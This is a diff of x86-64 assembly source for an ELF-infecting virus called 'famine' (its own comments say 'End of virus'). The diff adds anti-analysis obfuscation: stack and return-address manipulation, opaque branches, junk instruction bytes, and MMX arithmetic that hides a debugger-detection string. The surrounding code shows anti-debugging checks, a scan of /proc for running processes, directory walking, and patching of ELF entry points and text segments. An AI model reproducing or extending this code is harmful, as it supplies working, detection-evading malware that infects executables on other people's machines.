@@ -10,9 +10,69 @@ section .text
     global _famine
 
 _famine:
-    PUSH
+    PUSH        ; little obfuscation
     mov rbp, rsp
     sub rsp, FILE_SIZE + DIRENT + FSTAT + ENTRY + MAPPED_FILE
+
+obfu:
+    push rax              ; rsp - 8
+    push rcx              ; rsp - 8
+    push rdx              ; rsp - 8
+    mov rcx, rsp          ; new rsp
+    mov rsp, rbp          ; rsp = RBP(current stack frme at start)
+    pop rbp               ; pop original RBP
+    pop rax               ; pop ret addr
+    lea rdx, [rel $ + 84] ; new ret  addr
+    push rdx              ; push new ret addr
+    push rdx              ; align
+    ret
+
+ahahahaha:
+    push rbp
+    mov rbp, rsp
+    xor rax, rax
+    cmp rax, rax
+    je j0
+    cmp rax, rdi
+    je j1
+    add rax, 0x4242
+    cmp rax, rsi
+    je j2
+    cmp rax, rdx
+    je j3
+    cmp rax, rcx
+    je j4
+    jmp [rel $ + 0x84]
+j0:
+    jmp [rel $ + 46]
+j1:
+    jmp [rel $ + 72]
+j2:
+    jmp [rel $ + 128]
+j3:
+    jmp [rel $ + 256]
+j4:
+    jmp [rel $ + 512]
+
+back_at_it:
+    pop rdx
+    push rax
+    push rbp
+    mov rbp, rsp
+    mov rsp, rcx
+    pop rdx
+    pop rcx
+    pop rax
+    push rax
+    xor rax, rax
+    jz begin
+
+db 0x89 ; mov
+db 0x84 ; MOD-REG-R/M
+db 0xD9 ; SIB
+
+begin:
+    pop rax
 ; ANTI DEBUG
     mov rdi, 0
     mov rsi, 0
@@ -22,10 +82,30 @@ _famine:
     syscall
     cmp rax, 0
     jge anti_process
-    mov rax, qword 0x4e49474755424544
-    mov [rsp], rax
-    mov rax, 0x0a2e2e47
-    mov [rsp + 8], rax
+;  44 45  42 55 47 47 49 4e 47 2e 2e 0a = "DEBUGGING..\n"
+;- 24 19  22 1f 0c 2a 48 3a 0e 1e 05 01
+;  20 2c  20 36 3b 1d 01 14 39 10 29 09
+    mov rcx, 0x42422a0c1f221924
+    movq mm0, rcx
+    mov rcx, 0x42421d3b36202c20
+    movq mm1, rcx
+    paddusb mm0, mm1
+    movq rcx, mm0
+    emms
+    shl rcx, 0x10
+    shr rcx, 0x10
+    mov [rsp], rcx
+
+    mov rcx, 0x424201051e0e3a48
+    movq mm2, rcx
+    mov rcx, 0x4242092910391401
+    movq mm3, rcx
+    paddusb mm2, mm3
+    movq rcx, mm2
+    emms
+    shl rcx, 0x10
+    shr rcx, 0x10
+    mov [rsp + 6], rcx
     mov rdi, 1
     lea rsi, [rsp]
     mov rdx, 13
@@ -35,7 +115,7 @@ _famine:
 
 anti_process:
 ; open /proc/
-    mov rax, 0x2f636f72702f     ; need to hide this LOL.
+    mov rax, 0x2f636f72702f
     mov [rsp], rax
     mov [rsp + 6], byte 0x0
     lea rdi, [rsp]
@@ -177,7 +257,7 @@ open_dir:
     mov rax, SYS_GETDENTS
     mov rsi, rsp
     add rsi, 256                                        ; offset struct dirent
-    mov rdx, 1024
+    mov rdx, DIRENT
     syscall
     mov r13, rax
     mov rax, SYS_CLOSE
@@ -314,7 +394,6 @@ patch_segtext:
     mov rax, [rbp - 16]
     mov rcx, [rax + Elf64_Ehdr.e_entry]
     mov [rbp - 30], rcx                                     ; save entry point
-    ; push rcx
     xor rcx, rcx
     mov cx, word [rax + Elf64_Ehdr.e_phnum]                 ; n phdr
     xor rax, rax
@@ -433,7 +512,7 @@ next_file:
     jmp find_file
 
 next_dir:
-    mov rcx, 1024
+    mov rcx, DIRENT
     memset [rsp + 256], rcx                                ; dirent memset
     .next:
         cmp r14, 1
@@ -441,6 +520,7 @@ next_dir:
 
 clean:
     add rsp, FILE_SIZE + DIRENT + FSTAT + ENTRY + MAPPED_FILE
+    mov rsp, rbp
     POP
 
 _v_stop:                                                   ; End of virus
